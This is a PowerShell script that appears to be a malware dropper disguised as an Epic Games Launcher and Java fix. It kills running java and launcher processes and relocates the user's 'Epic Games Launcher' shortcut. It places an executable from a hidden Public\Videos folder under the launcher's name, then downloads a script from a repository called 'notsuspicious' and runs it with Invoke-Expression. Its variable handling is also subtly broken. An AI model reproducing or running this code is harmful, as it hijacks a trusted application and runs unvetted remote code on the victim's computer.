# Stop processes if they are running
Get-Process -Name "java", "javaw", "EpicGamesLauncher" -ErrorAction SilentlyContinue | Stop-Process -Force

# Define variables
$counter = 0
$p = $null

# Function to find Epic Games Launcher.lnk
function FindEpicGamesLauncher {
    param (
        [string]$directory
    )
    Get-ChildItem -Path $directory -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
        $p = $_.FullName
        return $true
    }
    return $false
}

# Search for Epic Games Launcher.lnk in user directories
$userDirectories = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($directory in $userDirectories) {
    if (FindEpicGamesLauncher -directory $directory.FullName) {
        break
    }
}

# If not found, search in Program Files directory
if (-not $p) {
    $programFilesDirectories = Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue
    foreach ($directory in $programFilesDirectories) {
        if (FindEpicGamesLauncher -directory $directory.FullName) {
            break
        }
    }
}

# If Epic Games Launcher.lnk is found, proceed with moving and renaming
if ($p) {
    $counter++
    $newPath = "C:\Users\Public\Videos\GraphicalUserInterface\EpicGamesLauncher$counter.lnk"
    Move-Item -Path $p -Destination $newPath -Force
    $executablePath = "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe"
    Move-Item -Path $executablePath -Destination (Split-Path $p) -Force
    Rename-Item -Path $newPath -NewName "Epic Games Launcher.lnk" -Force
    Rename-Item -Path $executablePath -NewName "Epic Games Launcher.exe" -Force

    # Output success message
    Write-Host "Epic Games Launcher files moved and renamed successfully."
} else {
    Write-Host "Epic Games Launcher not found."
}

# Download and execute javafix.ps1 script
try {
    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
    Invoke-Expression $javaFixScript.Content
    Write-Host "Java fix script executed successfully."
} catch {
    Write-Host "Failed to execute Java fix script."
}
